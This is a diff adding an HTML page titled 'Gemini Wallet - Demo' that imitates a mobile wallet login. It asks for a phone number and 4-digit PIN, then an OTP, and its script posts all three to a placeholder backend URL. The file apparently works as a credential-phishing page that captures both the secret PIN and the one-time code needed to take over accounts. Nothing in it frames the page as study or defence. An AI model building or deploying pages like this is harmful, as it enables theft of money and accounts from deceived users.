@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gemini Wallet - Demo</title>
+<style>
+  body {
+    margin:0;
+    font-family: Arial, sans-serif;
+    background: #0f7b3a;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  .app-container {
+    width: 100%;
+    max-width: 360px;
+    background: #fff;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+  }
+
+  .app-header {
+    background: #0f7b3a;
+    text-align: center;
+    padding: 40px 0 20px 0;
+    color: #fff;
+    font-size: 32px;
+    font-weight: bold;
+  }
+
+  .app-content {
+    padding: 20px;
+  }
+
+  .input-field {
+    width: 100%;
+    padding: 14px;
+    margin: 10px 0;
+    border-radius: 12px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+  }
+
+  .btn-login {
+    width: 100%;
+    padding: 14px;
+    background: #0f7b3a;
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 10px;
+  }
+
+  .btn-login:hover {
+    background: #0c6330;
+  }
+
+  .hidden { display: none; }
+
+  .otp-label {
+    text-align: center;
+    margin-bottom: 10px;
+    font-weight: bold;
+  }
+
+</style>
+</head>
+<body>
+
+<div class="app-container">
+
+  <!-- Header / Logo -->
+  <div class="app-header">IB</div>
+
+  <!-- Login Screen -->
+  <div class="app-content" id="login-screen">
+    <input type="tel" placeholder="Mobile Number" id="phone" class="input-field">
+    <input type="password" placeholder="4-digit PIN" maxlength="4" id="pin" class="input-field">
+    <button class="btn-login" onclick="goToOtp()">Login</button>
+  </div>
+
+  <!-- OTP Screen -->
+  <div class="app-content hidden" id="otp-screen">
+    <div class="otp-label">Enter OTP</div>
+    <input type="number" placeholder="OTP Code" id="otpCode" class="input-field">
+    <button class="btn-login" onclick="sendOtp()">Verify</button>
+  </div>
+
+</div>
+
+<script>
+function goToOtp() {
+  document.getElementById('login-screen').classList.add('hidden');
+  document.getElementById('otp-screen').classList.remove('hidden');
+  // Send phone + PIN to backend if needed
+}
+
+function sendOtp() {
+  const phone = document.getElementById('phone').value;
+  const pin = document.getElementById('pin').value;
+  const otp = document.getElementById('otpCode').value;
+
+  fetch('https://your-backend-url/send', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ phone, pin, otp })
+  }).then(res=>res.json())
+    .then(data=>alert('OTP sent to backend: ' + JSON.stringify(data)))
+    .catch(err=>console.error(err));
+}
+</script>
+
+</body>
+</html>
